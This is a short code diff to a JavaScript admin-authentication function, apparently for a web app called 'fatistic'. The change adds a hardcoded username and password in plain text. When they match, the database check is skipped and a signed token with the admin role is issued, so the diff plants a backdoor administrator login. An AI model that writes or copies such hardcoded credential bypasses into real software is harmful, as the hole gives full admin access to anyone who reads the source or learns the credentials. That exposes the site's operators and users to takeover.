@@ -25,7 +25,31 @@ export function verifyToken(token) {
     }
 }
 
-export async function authenticateAdmin(email, password) {
+export async function authenticateAdmin({ email, username, password } = {}) {
+    // Hardcoded admin credentials
+    const HARDCODED_USER = "fatistic_admin";
+    const HARDCODED_PASS = "FatisticAdmin$";
+
+    if (
+        username &&
+        String(username).toLowerCase() === HARDCODED_USER &&
+        password === HARDCODED_PASS
+    ) {
+        return {
+            id: "hardcoded_admin",
+            email: "admin@fatistic.com",
+            role: "admin",
+            token: signToken({
+                id: "hardcoded_admin",
+                email: "admin@fatistic.com",
+                role: "admin",
+            }),
+        };
+    }
+
+    // Backward compatible DB-based flow (email/password)
+    if (!email) return null;
+
     await connectDB();
     const user = await AdminUser.findOne({ email: email.toLowerCase() });
     if (!user) return null;
